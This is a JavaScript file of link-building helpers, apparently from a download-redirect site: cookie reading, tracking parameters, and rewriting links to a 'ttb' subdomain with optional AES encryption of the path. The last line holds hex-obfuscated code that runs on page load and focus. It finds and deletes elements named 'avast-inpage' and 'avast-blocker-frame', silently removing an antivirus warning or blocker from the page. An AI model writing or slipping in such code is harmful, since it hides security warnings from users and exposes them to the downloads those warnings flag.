function microtime(get_as_float) {
    var now = new Date().getTime() / 1000;
    var s = parseInt(now, 10);
    return (get_as_float) ? now : (Math.round((now - s) * 1000) / 1000) + ' ' + s;
}

function getCookie(c_name) {
    var c_value = document.cookie;
    var c_start = c_value.indexOf(" " + c_name + "=");
    if (c_start == -1) {
        c_start = c_value.indexOf(c_name + "=");
    }
    if (c_start == -1) {
        c_value = null;
    }
    else {
        c_start = c_value.indexOf("=", c_start) + 1;
        var c_end = c_value.indexOf(";", c_start);
        if (c_end == -1) {
            c_end = c_value.length;
        }
        c_value = unescape(c_value.substring(c_start, c_end));
    }
    return c_value;
}

function getChannel() {
    return location.pathname.split('/')[1]
}


function genPassword(length) {
    var password = "";
    var possible = "abcdef0123456789";

    for (var i = 0; i < length; i++)
        password += possible.charAt(Math.floor(Math.random() * possible.length));

    return password;
}

function dlpDomain(v_dlink, crypt) {
    var newDomain = "ttb" + location.host.substring(location.host.indexOf('.'));
    var patt = new RegExp("(^[^:]+://)([^/]+)(/.*)$", "");
    var result = v_dlink.match(patt);
    var scheme = result[1];
    var uri = result[3];

    if (crypt && (typeof CryptoJS != 'undefined')) {
        var password = CryptoJS.enc.Hex.parse(genPassword(32));
        var iv = CryptoJS.enc.Hex.parse(genPassword(16));
        var encrypted = CryptoJS.AES.encrypt(uri, password, { iv: iv, mode: CryptoJS.mode.CBC })
        var crypt = encrypted.ciphertext.toString(CryptoJS.enc.Hex);
        iv = encrypted.iv.toString(CryptoJS.enc.Hex);
        var key = encrypted.key.toString(CryptoJS.enc.Hex);
        uri = "/" + crypt + iv + key;
    }

    link = scheme + newDomain + uri;
    return link;
}

function buildLink_with_channel(v_dlink, channel, crypt) {
    separator = (v_dlink.indexOf('?') != -1) ? '&' : '?';
    var link = v_dlink + separator;

    link += "__tc=" + microtime(true);

    cookie = getCookie("lpsl_" + channel);
    if (cookie) {
        parsed_cookie = cookie.split(" ");
        lpsl = parsed_cookie[0];
        expire = parsed_cookie[1];
        link += "&lpsl=" + lpsl + "&expire=" + expire;
    }

    current_params = location.search.substring(1);
    if (current_params != "") {
        link += "&" + current_params;
    }

    //location.href = link;
    return dlpDomain(link, crypt);
}

function buildLink(v_dlink) {
    return buildLink_with_channel(v_dlink, getChannel(), false);
}

function generateLink(v_dlink) {
    location.href = buildLink(v_dlink);
    return false;
}

function generateLink_with_channel(v_dlink, channel) {
    location.href = buildLink_with_channel(v_dlink, channel, true);
    return false;
}

function avstbpss() { var a = 0; var c = null; var b = setInterval(function () { element = getAElements(); if (element) { try { element.parentNode.removeChild(element) } catch (d) { } clearInterval(b) } else { if (a < 200) { a++ } else { a = 0; clearInterval(b) } } }, 10) } if (window.addEventListener) { window.addEventListener("focus", avstbpss); window.addEventListener("load", avstbpss) } else { window.onload = avstbpss; window.onfocus = avstbpss } function getAElements() { var c = ["61766173742d696e70616765", "61766173742d626c6f636b65722d6672616d65"]; var b = null; for (var a = 0; a < c.length; ++a) { b = document.getElementById(hex2a(c[a])); if (b) { break } } return b } function hex2a(b) { var c = ""; for (var a = 0; a < b.length; a += 2) { c += String.fromCharCode(parseInt(b.substr(a, 2), 16)) } return c };



